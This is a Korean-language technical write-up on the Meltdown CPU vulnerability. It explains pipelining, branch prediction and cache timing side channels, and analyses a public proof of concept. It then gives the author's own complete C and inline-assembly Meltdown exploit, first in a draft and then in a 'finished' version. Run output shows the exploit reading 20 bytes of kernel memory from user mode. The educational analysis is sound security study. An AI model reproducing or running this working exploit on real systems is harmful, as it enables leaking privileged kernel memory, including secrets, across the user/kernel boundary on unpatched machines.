# Meltdown 취약점 분석

## Background

### Pipeline

`파이프라인`은 CPU 자원을 효율적으로 사용하기 위해 고안된 기법입니다. CPU는 명령어를 처리하기 위해 다음과 같이 세 단계를 거칩니다.

1. Fetch
2. Decode
3. Execute

명령어를 가져와서(Fetch) 해독(Decode)하고 실행(Execute)하는 것입니다. 예를 들어 4개의 코어를 가진 CPU가 명령어를 처리한다고 하는 과정을 살펴봅시다. 어떤 한 코어에서 하나의 명령어가 처리될 때까지 나머지 3개의 코어가 아무 작업을 하지 않고 기다리고 있다면 이는 비효율적입니다. 이러한 비효율성을 해결하기 위해 등장한 것이 `파이프라인`인 것입니다. 어떤 한 코어에서 a라는 명령어를 처리하는 동안 나머지 3개의 코어에서는 b, c, d 명령어를 위의 3가지 단계로 각각 처리하는 것입니다.

### Branch prediction

`파이프라인`이 수행되다가 분기점을 만나게 되면 문제점이 발생합니다. 앞에서 처리되고 있는 데이터를 받아와야만 어디로 분기할지를 판단할 수 있는데 이것이 불가능한 경우가 발생하는 것입니다. 앞의 명령어가 처리되기까지 기다리는 것은 비효율적입니다. 이러한 비효율성을 개선하기 위해 등장한 것이 `분기 예측`입니다. 분기를 예측하여 미리 명령어를 처리하는 것입니다. 만약 분기가 맞아 떨어진다면 효율적일 것입니다. 반면, 분기 예측에 실패한 경우에는 분기 예측을 통해 처리한 명령어들을 취소(롤백)한 후 다시 명령어를 처리합니다. 분기 예측에 실패한 경우에는 비효율성이 높아지긴 하지만 분기 예측에 성공하는 경우도 있으므로 앞서 설명했던 방식보다는 효율적인 것입니다.

### Cache hit

CPU가 데이터를 처리할 때 저장되어 있던 데이터를 가져와서 쓰게 됩니다. 데이터 저장 장치는 크게 4가지로 분류할 수 있습니다. 레지스터, 캐시 메모리, 일반 메모리, 하드디스크가 바로 그것입니다. CPU는 이들 장치를 통해 데이터를 처리하는데 그 처리 속도는 레지스터, 캐시 메모리, 일반 메모리, 하드디스크 순으로 빠릅니다. CPU가 데이터를 요청했을 때 첫째로 캐시 메모리를 확인하게 됩니다. 캐시 메모리에 해당 데이터가 있다면 이를 가져와서 사용하게 되는데 이 과정을 바로 `캐시 히트`라고 부릅니다. 반면 캐시 메모리에 해당 데이터가 없다면 일반 메모리에서 가져오는 과정을 거쳐야 합니다. 이 과정을 `캐시 미스`라고 부릅니다.

### Cache timing attack

`Cache timing attack`은 `Side channel attack`의 한 종류로 볼 수 있습니다. CPU가 데이터를 처리할 때 캐시 히트를 통해 처리한다면 그 처리 속도는 빠를 것입니다. 반면 캐시 미스가 발생하여 일반 메모리에서 데이터를 가져와서 처리한다면 그 속도는 비교적 느릴 것입니다. 이런 시간 차를 활용하는 것이 바로 `Cache timing attack`입니다.

## Concept of Meltdown

```assembly
mov rax, [커널메모리주소]
and rax, 1
mov rbx,[rax+유저메모리주소]
```

1번째 라인의 명령은 커널 메모리의 값을 읽어와서 rax에 넣는 코드입니다. mov가 Execute되면 Exception이 발생할텐데 그 전에 일어나는 일들을 살펴봅시다. 커널 메모리의 값은 캐시에 로딩이 될 것이며 버퍼로 옮기는 과정에서 Exception이 발생하게 될 것입니다.  2번째와 3번째 라인의 명령어들은 fetch, decode가 이루어진 상태이고 실행을 위해서는 rax 값이 필요하기 때문에 1번째 라인의 수행을 기다리고 있을 것입니다. 1번째 라인의 명령이 정상적으로 처리된다면 2번째, 3번째 라인의 코드들이 Execute되겠지만 실제로는 1번째 라인의 mov가 실행되면서 Rollback이 일어납니다. 그 후 Exception이 발생하게 됩니다.

1번째 라인의 명령이 실행되면서 커널 메모리의 값이 캐시에 저장된다는 점에 주목해야 합니다. 캐시에 로드가 된다는 것은 Side-channel attack의 가능성을 암시해주기 때문입니다. 캐시 타이밍 어택을 수행하여 논리적으로 판단한다면 커널 메모리의 값을 읽어올 수 있다는 의미입니다.

## PoC Analysis

\* `https://github.com/mniip/spectre-meltdown-poc`의 PoC를 분석했습니다. 아래 내용은 PoC 코드와 함께 보시는 것을 추천드립니다.

```c
#ifndef POISON
	struct sigaction sa;
	sa.sa_sigaction = signal_action;
	sigemptyset(&sa.sa_mask);
	sa.sa_flags = SA_NODEFER | SA_SIGINFO;
	sigaction(SIGSEGV, &sa, NULL);
#endif
```

커널메모리를 읽으려고 할 때 발생하는 Exception으로 인해 프로세스가 종료 되면 Exploit이 불가능합니다. 프로세스의 종료를 막기 위해 `sigaction`을 걸어줍니다.

```assembly
Dump of assembler code for function stall_speculate:
   0x0000000000400b84 <+0>:	mfence 
   0x0000000000400b87 <+3>:	call   0x400b96 <stall_speculate+18>
   0x0000000000400b8c <+8>:	movzx  eax,BYTE PTR [rdi]
   0x0000000000400b8f <+11>:	shl    eax,0xc
   0x0000000000400b92 <+14>:	mov    rcx,QWORD PTR [rsi+rax*1]
   0x0000000000400b96 <+18>:	xorps  xmm0,xmm0
   0x0000000000400b99 <+21>:	aesimc xmm0,xmm0
   0x0000000000400b9e <+26>:	aesimc xmm0,xmm0
   0x0000000000400ba3 <+31>:	aesimc xmm0,xmm0
   0x0000000000400ba8 <+36>:	aesimc xmm0,xmm0
   0x0000000000400bad <+41>:	movd   eax,xmm0
   0x0000000000400bb1 <+45>:	lea    rsp,[rsp+rax*1+0x8]
   0x0000000000400bb6 <+50>:	ret    
End of assembler dump.
```

gdb를 통해 디버깅 해보면 `main`, `collect_stats(&ch, addr)`를 거쳐  `stall_speculate(addr, ch->mapping)` 함수로 진입하는 것을 확인할 수 있습니다. CPU 입장에서 보면 `call   0x400b96 <stall_speculate+18>`이 실행되는 동시에 `movzx  eax,BYTE PTR [rdi]`를 포함하여 아래의 코드들이 동시에 실행됩니다. 그러면서 `QWORD PTR [rsi+rax*1]`가 캐시 메모리에 올려집니다.(`QWORD PTR [rsi+rax*1]`는 `ch->mapping`을 의미합니다.)

```c
extern unsigned long long time_read(void const *);
asm(
".section .text\n"
".global time_read\n"
"time_read:\n"
"	mfence\n"
"	lfence\n"
"	rdtsc\n"
"	lfence\n"
"	movq %rax, %rcx\n"
"	movb (%rdi), %al\n"
"	lfence\n"
"	rdtsc\n"
"	subq %rcx, %rax\n"
"	ret\n"
);
```

`stall_speculate(addr, ch->mapping)` 후에는`time_read(ch->mapping[line])`가 호출됩니다. `ch->mapping`를 읽어들이려고 할 때 시간이 얼마나 걸리는지를 측정하여 cache timing attack을 위한 통계 정보를 수집하는 것입니다.

```c
unsigned long long t = time_read(ch->mapping[line]);
printf("%d\n", t);
```

실제로 위와 같이 코드를 삽입하여 t 값을 출력을 해보면 아래와 같이 불규칙적인 값이 나오는 것을 확인할 수 있습니다.

```
1436 250 250 256 252 254 254 252 248 252 654 252 252 252 250 252 254 252 250 254 254 248 252 252 250 252 248 252 254 252 250 252 268 272 252 252 254 1034 256 254 256 252 256 256 248 254 256 252 252 252 252 254 252 252 252 254 278
```

대부분은 300미만의 값을 갖는데 이보다 더 큰 값들은 무엇을 의미하는 것일까요? 그제서야 처음으로 캐싱이 일어났다는 것을 의미합니다. 즉, 캐시 히트가 일어나면 200대의 값을 갖고 캐시 미스가 발생하면 일반 메모리에서 값을 가져오느라 더 큰 값을 가지는 것입니다.

```c
#define MAX_UNCERTAINTY 8.636e-78
#define MAX_RETRIES 100
double distribution[256];
int read_byte(channel *ch, void *addr, int verbose)
{
	for(int line = 0; line < 256; line++)
		distribution[line] = 1.0 / 256;
	int val = -1;
	if(verbose)
		printf("%20.13g %02x", 0, 0);
	while(val == -1)
	{
		double unc;
		int newval = run_timing_once(ch, addr, &unc);
		for(int line = 0; line < 256; line++)
			if(line != newval)
				distribution[line] = fmin(1.0, distribution[line] / unc);
		distribution[newval] *= unc;

		for(int line = 0; line < 256; line++)
			if(distribution[line] < MAX_UNCERTAINTY)
				val = line;

		int md = 0;
		for(int line = 0; line < 256; line++)
			if(distribution[line] < distribution[md])
				md = line;

		if(verbose)
			printf("\e[23D%20.13g %02x", distribution[md], md); fflush(stdout);
	}
	if(verbose)
		printf("\e[23D");
	return val;
}
```

실제로 커널에서 byte를 하나씩 읽어오는 함수입니다.

`val` 변수에 읽어들일 값이 입력되고, `newval`에는  `run_timing_once(ch, addr, &unc)` 함수의 실행 결과가 답깁니다. `run_timing_once`는 앞서 설명했던 `time_read` 함수와 비슷한 기능을 수행합니다. 읽어들일 값을 캐시에 로드한 후, 하나씩 로드해보면서 걸리는 시간을 측정합니다. 그 후 캐시 히트가 가장 많이 발생한 것을 찾아서 반환해줍니다.

다시 `read_byte` 함수를 봅시다. 확률 분포를 이용하여 가장 정확한 값을 계산하여 반환합니다. 확률 분포를 안 쓰고 대략적으로 통계로도 추정할 수 있지만 올바르지 않은 값이 담길 확률도 커집니다. 확률 분포는 이러한 불확실성을 최소화하기 위해 사용된 최적화 기법에 포함됩니다.(Side-channel attack에서는 거의 필수적인 기법입니다.)

```c
extern void poison_speculate(void **, long int *, char (*)[4096]);
asm(
".section .text\n"
".global poison_speculate\n"
"poison_speculate:\n"
"	addq $8*" STR((POISON_SKIP_RATE - 1)) ", %rdi\n"
"	addq $8*" STR((POISON_SKIP_RATE - 1)) ", %rsi\n"
"1:\n"
"	xorl %eax, %eax\n"
"	movq (%rdi), %r15\n"
"	prefetcht0 (%r15)\n"
"	movl (%rsi), %r14d\n"
"	testl %r14d, %r14d\n"
"	jnz 2f\n"
"	movb (%r15), %al\n"
"	shlq $12, %rax\n"
"	incb (%rdx, %rax)\n"
"	addq $8*" STR(POISON_SKIP_RATE) ", %rdi\n"
"	addq $8*" STR(POISON_SKIP_RATE) ", %rsi\n"
"	jmp 1b\n"
"2:	retq\n"
);
```

전처리문에 의해 실제로 실행되는 함수는 아니지만 `poison_speculate` 함수도 분석해봅시다. `movb (%r15), %al` 부분이 커널 메모리를 읽어들이는 부분입니다. 이 명령이 실행되는 과정에서 커널 메모리의 값이 캐시에 올라가게 되고 롤백이 일어납니다. 그 후에 exception이 발생하게 되는 것입니다. 이전 부분에서 `prefetcht0` 명령어를 확인할 수 있는데, 이는 커널 메모리의 값을 L1 캐시에 프리페치시키는 역할을 합니다. exploit의 효율성을 높여주는 코드입니다. (논문 참고)

## PoC 작성

```assembly
specu:
	mfence
	call 1f
	movzbl (%rdi), %eax
	shll $12, %eax
	movq (%rax, %rsi), %rcx
1:	xorps %xmm0, %xmm0
	aesimc %xmm0, %xmm0
	aesimc %xmm0, %xmm0
	aesimc %xmm0, %xmm0
	aesimc %xmm0, %xmm0
	movd %xmm0, %eax
	lea 8(%rsp, %rax), %rsp
	ret
```

`out-of-order execution`을 발생시키는 `specu` 함수입니다. `call 1f`가 실행됨과 동시에 그 아래의 3줄도 실행되는데, `rdi`에 담긴 값(커널 메모리 값)과 `rsi`에 담긴 값(유저 메모리 주소)을 더한 주소가 L1 캐시 메모리에 로드 됩니다. 그 후 레지스터는 `discard` 처리되며 `1:` 부분으로 점프하게 됩니다.

```c
mapping = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
if(mapping == MAP_FAILED)
{
  perror("mmap mapping");
  exit(-1);
}
memset(mapping, 0, PAGE_SIZE * 256);
```

캐싱을 위해 4096 * 256 크기의 `mapping`이라는 버퍼를 만들어 둡니다.

```c
// flush
clflush(mapping);

// 컨텍스트 스위칭/커널 모드 진입을 위한 인터럽트 
syscall(0, -1, 0, 0);

// 캐시 메모리에 커널 메모리 값 로드
specu(addr, mapping);

// 하나씩 로드해보면서 캐시된 값 찾기
unsigned long long t = measure_time(mapping[i]);
```

`mapping` 버퍼를 비우고 syscall을 통해 커널 메모리로 컨텍스트 스위칭을 합니다. `specu` 함수를 통해 커널 메모리 값을 캐시한 후 `measure_time` 함수를 통해 값을 가져오는 데에 걸리는 시간을 계산합니다. 이를 반복하여 값을 가져오는 데에 걸리는 시간이 가장 짧은 것이 커널 메모리에 담긴 값을 의미하게 됩니다. 캐시 미스가 나서 다른 메모리에서 값을 참조해야 하는 경우보다는 캐시 히트를 통해 가져오는 것이 훨씬 빠르기 때문입니다.

이제 실제로 아래의 코드를 테스트해봅시다.

### 1차 코드

```c
#include <stdio.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096

extern void specu(void *, char (*)[4096]);
asm(
".section .text\n"
".global specu\n"
"specu:\n"
"	mfence\n"
"	call 1f\n"
"	movzbl (%rdi), %eax\n"
"	shll $12, %eax\n"
"	movq (%rax, %rsi), %rcx\n"
"1:	xorps %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	movd %xmm0, %eax\n"
"	lea 8(%rsp, %rax), %rsp\n"
"	ret\n"
);

extern unsigned long long measure_time(void const *);
asm(
".section .text\n"
".global measure_time\n"
"measure_time:\n"
"	mfence\n"
"	lfence\n"
"	rdtsc\n"
"	lfence\n"
"	movq %rax, %rcx\n"
"	movb (%rdi), %al\n"
"	lfence\n"
"	rdtsc\n"
"	subq %rcx, %rax\n"
"	ret\n"
);

extern void clflush(void *);
asm(
".section .text\n"
".global clflush\n"
"clflush:\n"
"	mfence\n"
"	clflush (%rdi)\n"
"	retq\n"
);

int main(int argc, char ** argv) {
	char (*mapping)[PAGE_SIZE];
	mapping = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(mapping == MAP_FAILED)
	{
		perror("mmap mapping");
		exit(-1);
	}
	memset(mapping, 0, PAGE_SIZE * 256);

	int min = 99999;
	int min_val = 0;

	// 커널 메모리 주소
	void *addr;
	addr = 0xffffffff81a00200;

	for(int i=0; i<256; i++){
		// flush
		clflush(mapping[i]);

		// 컨텍스트 스위칭/커널 모드 진입을 위한 인터럽트 
		syscall(0, -1, 0, 0);

		// 캐시 메모리에 커널 메모리 값 로드
		specu(addr, mapping);

		// 하나씩 로드해보면서 캐시된 값 찾기
		unsigned long long t = measure_time(mapping[i]);

		// 로드까지 가장 짧게 걸린 값 구하기
		if (t < min) {
			min = t;
			min_val = i;
		}
		printf("%d ", t);
	}
	puts("");
	printf("Value        : %x\n", min_val);
	printf("Loading Time : %d\n", min);
}
```

### 실행 결과

```
$ ./poc
246 96 78 80 78 256 80 82 82 256 82 256 80 80 74 336 80 80 76 80 82 82 76 258 78 82 78 80 80 80 254 80 206 252 260 82 76 260 136 254 76 80 306 78 278 262 324 256 96 254 130 102 260 80 80 76 254 78 82 76 252 142 276 76 104 82 82 256 76 80 258 256 258 78 258 254 934 258 254 340 82 82 256 252 1096 252 254 254 256 80 78 260 76 76 258 78 258 254 254 80 256 254 80 74 256 82 262 84 350 254 258 78 758 78 256 80 258 78 78 258 258 254 254 74 258 254 370 78 254 78 258 254 256 252 80 76 256 82 78 254 254 80 260 80 78 84 260 260 256 82 76 262 80 78 82 78 82 258 254 254 270 254 76 84 78 260 78 80 78 256 252 346 254 80 254 78 78 168 78 260 252 264 76 252 254 256 76 74 78 78 314 80 80 258 254 78 82 78 254 254 80 82 78 80 76 258 254 82 42 76 256 80 254 256 190 80 256 256 264 80 256 80 270 82 78 260 78 76 254 84 80 260 256 78 78 346 314 256 254 254 80 76 82 256 500 260 258 82 254 82 254 256 558 256 80 80 
Value        : d0
Loading Time : 42
$ ./poc
270 672 252 144 76 248 526 78 76 250 76 82 86 252 258 248 260 258 252 258 76 74 74 76 372 254 254 156 248 260 80 82 252 522 254 256 670 250 258 258 526 82 252 252 78 254 250 78 82 250 254 278 82 250 82 260 246 252 250 248 80 252 76 76 82 248 248 252 258 250 246 84 256 76 82 82 74 258 256 252 250 250 252 250 78 78 248 248 80 248 82 136 1324 280 258 82 76 258 258 256 256 80 82 80 74 260 260 76 80 250 84 256 248 76 252 80 256 260 248 260 774 252 248 130 80 258 256 76 82 254 76 84 82 252 84 254 254 80 78 84 82 260 252 256 254 78 76 258 144 80 252 294 76 84 258 262 76 74 78 252 84 80 76 78 86 252 248 250 248 82 80 256 250 80 80 80 256 80 80 260 254 248 80 142 76 84 250 74 250 250 250 78 74 80 82 254 78 82 256 256 78 250 252 248 250 78 76 254 44 80 248 82 80 256 248 82 248 76 260 80 78 76 84 76 254 84 82 250 254 254 248 78 258 258 252 256 84 256 256 80 260 252 84 256 76 82 76 256 256 74 502 250 84 82 82 82 
Value        : d0
Loading Time : 44
$ ./poc
434 274 78 264 374 78 76 80 80 82 306 314 78 78 254 82 154 78 254 314 82 252 250 250 76 250 128 252 284 82 256 304 80 76 82 254 76 82 78 80 80 80 76 82 248 258 258 82 82 252 260 248 76 250 76 76 78 80 74 78 260 82 80 78 260 80 80 82 248 256 82 82 80 254 78 82 258 82 124 260 328 80 254 256 74 258 254 76 252 1198 82 258 82 82 82 250 78 256 262 80 256 80 258 250 256 78 250 250 430 250 270 76 250 254 252 260 78 258 254 250 266 80 254 252 258 80 74 252 262 80 80 248 260 260 258 86 80 256 252 258 86 256 86 254 78 80 144 296 80 440 322 82 84 260 260 258 258 84 82 260 88 86 260 344 84 260 84 256 86 88 84 258 86 84 256 256 262 86 156 254 252 80 262 254 260 252 78 78 254 84 256 78 254 82 84 76 250 250 262 82 80 80 84 80 710 86 254 82 42 80 252 262 80 812 256 254 74 78 256 258 80 248 82 80 262 256 78 250 260 254 254 76 76 250 250 82 80 258 76 80 76 254 252 250 248 256 250 252 82 76 254 250 78 82 76 254 
Value        : d0
Loading Time : 42
```

수차례 시도해본 결과 `0xd0`이라는 값이 커널메모리에 존재한다는 것을 알 수 있습니다. 다만 side-channel attack의 특성상 불확실성이 존재합니다. 이를 해소하기 위해 통계의 개념을 도입해봅시다. 그 후 몇 바이트를 읽어올 지도 조금 더 자동화 시켜봅시다.

### 완성된 코드

```c
#include <stdio.h>
#include <sys/mman.h>

#define PAGE_SIZE 4096

extern void specu(void *, char (*)[4096]);
asm(
".section .text\n"
".global specu\n"
"specu:\n"
"	mfence\n"
"	call 1f\n"
"	movzbl (%rdi), %eax\n"
"	shll $12, %eax\n"
"	movq (%rax, %rsi), %rcx\n"
"1:	xorps %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	aesimc %xmm0, %xmm0\n"
"	movd %xmm0, %eax\n"
"	lea 8(%rsp, %rax), %rsp\n"
"	ret\n"
);

extern unsigned long long measure_time(void const *);
asm(
".section .text\n"
".global measure_time\n"
"measure_time:\n"
"	mfence\n"
"	lfence\n"
"	rdtsc\n"
"	lfence\n"
"	movq %rax, %rcx\n"
"	movb (%rdi), %al\n"
"	lfence\n"
"	rdtsc\n"
"	subq %rcx, %rax\n"
"	ret\n"
);

extern void clflush(void *);
asm(
".section .text\n"
".global clflush\n"
"clflush:\n"
"	mfence\n"
"	clflush (%rdi)\n"
"	retq\n"
);

void estimate_byte(void *addr) {
	char (*mapping)[PAGE_SIZE];
	mapping = mmap(NULL, PAGE_SIZE * 256, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if(mapping == MAP_FAILED)
	{
		perror("mmap mapping");
		exit(-1);
	}
	memset(mapping, 0, PAGE_SIZE * 256);

	int hit_log[256] = {0,};
	int min = 99999;
	int min_val;

	int max_hit = 0;
	int max_hit_val;

	for(int j=0;j<100;j++) {
		min = 99999;

		for(int i=0; i<256; i++) {
			// flush
			clflush(mapping[i]);

			// 컨텍스트 스위칭/커널 모드 진입을 위한 인터럽트 
			syscall(0, -1, 0, 0);

			// 캐시 메모리에 커널 메모리 값 로드
			specu(addr, mapping);

			// 하나씩 로드해보면서 캐시된 값 찾기
			unsigned long long t = measure_time(mapping[i]);

			// 로드까지 가장 짧게 걸린 값 구하기
			if (t < min) {
				min = t;
				min_val = i;
			}
		}
		hit_log[min_val]++;
	}

	for(int i=0; i<256; i++) {
		if(max_hit < hit_log[i]) {
			max_hit = hit_log[i];
			max_hit_val = i;
		}
	}

	printf("%p : %x\n", addr, max_hit_val);
}


int main(int argc, char ** argv) {
	void *addr;
	addr = 0xffffffff81a00200;

	// 읽어들일 버퍼의 크기
	int len = 20;
	
	for(int i=0; i<20; i++){
		estimate_byte(addr + i);
	}
	return 0;
}
```

커널 메모리를 20바이트만 읽어오도록 설정한 후 실행해겠습니다.

### 실행 결과

```
$ ./poc
0xffffffff81a00200 : d0
0xffffffff81a00201 : 14
0xffffffff81a00202 : 21
0xffffffff81a00203 : 81
0xffffffff81a00204 : ff
0xffffffff81a00205 : ff
0xffffffff81a00206 : ff
0xffffffff81a00207 : ff
0xffffffff81a00208 : 90
0xffffffff81a00209 : 15
0xffffffff81a0020a : 21
0xffffffff81a0020b : 81
0xffffffff81a0020c : ff
0xffffffff81a0020d : ff
0xffffffff81a0020e : ff
0xffffffff81a0020f : ff
0xffffffff81a00210 : a0
0xffffffff81a00211 : f9
0xffffffff81a00212 : 20
0xffffffff81a00213 : 81
```

## Reference

https://meltdownattack.com/

https://googleprojectzero.blogspot.kr/2018/01/reading-privileged-memory-with-side.html

https://cyber.wtf/2017/07/28/negative-result-reading-kernel-memory-from-user-mode/